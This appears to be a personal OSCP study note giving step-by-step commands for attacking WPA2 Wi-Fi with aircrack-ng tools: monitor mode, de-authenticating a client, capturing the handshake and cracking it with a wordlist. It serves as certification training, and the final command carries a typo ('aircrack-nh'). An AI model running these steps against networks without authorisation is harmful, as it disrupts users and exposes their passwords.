---
aliases:
  - Web Application Exploitation
tags:
  - tech
  - cybsec
  - certification
  - oscp
  - wireless_pentesting
author: Mehdi N Tehrani
creat_date: 2023-12-13
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Overview
1. **Place** WiFi card in monitor mode
2. **Discover** info about network: channel, BSSID
3. **Select** network and capture data
4. **Perform** de-auth attack
5. **Capture** WPA handshake
6. **Attempt** to crack the handshake

# Process
## Place
initial check:
```
$ iwconfig
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=-2147483648 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```
Set wifi device into **monitor mode**:
```
$ sudo airmon-ng check kill

Killing these processes:

    PID Name
 347198 wpa_supplicant


$ sudo airmon-ng start wlan0

PHY     Interface       Driver          Chipset

phy0    wlan0           iwlwifi         Intel Corporation Wi-Fi 6 AX200 (rev 1a)
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```
Check if it's gone into monitor mode:
```
$ iwconfig
wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=-2147483648 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

**Stop monitor mode** and set back to *managed* or *station* mode:
```
$ sudo airmon-ng stop wlan0mon

PHY     Interface       Driver          Chipset

phy0    wlan0mon        iwlwifi         Intel Corporation Wi-Fi 6 AX200 (rev 1a)
                (mac80211 station mode vif enabled on [phy0]wlan0)
                (mac80211 monitor mode vif disabled for [phy0]wlan0mon)

```

## Discover
get a list of all wifi nodes around us:
`airodump-ng wlan0mon`
just channel 6:
`airodump-ng wlan0mon -c 6`

## Select
select the access point you'd want to attack

## Perform
#de_auth #deauth
de-auth attack. Kick someone off of wireless network to get a WPA2 handshake:
```
aireplay-ng -0 1 -a <ap_mac> -c <station_mac>
             ^ de-auth
               ^ attempt once
                  ^ access point 
                              ^ client - device we want to de-auth
```

## Capture
capture into file `capture`  files e.g. `capture-01.cap`, `capture-01.csv`, etc. will get generated
```
airodump-ng wlan0mon --bssid <ap_bssid> -w capture wlan0mon
```

## Attempt
crack ap password using a wordlist
```
aircrack-nh -w wordlist.txt -b <ap_bssid> <capture_file.cap>
```